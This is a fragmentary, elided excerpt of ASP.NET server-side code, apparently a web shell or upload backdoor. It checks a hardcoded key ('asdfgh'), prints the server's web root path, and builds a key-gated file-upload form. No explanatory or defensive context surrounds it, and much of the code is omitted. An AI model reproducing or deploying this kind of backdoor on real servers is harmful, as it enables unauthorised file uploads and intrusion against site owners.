...
<script runat="server">
    private const string AUTHKEY = "asdfgh";
    ...
    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            ...
            Response.Write("WebRoot: " + Page.MapPath("."));
    ...
    private string GetUploadControls()
    {
        ...
        temp += "<br>key: <input type=\"text\" name=\"authKey\"><br>";
        temp += "<br>Please specify a file: <input type=\"file\" name=\"file\"></br>";
        temp += "<div><input type=\"submit\" value=\"ASD\"></div>";
        temp += "</form>";
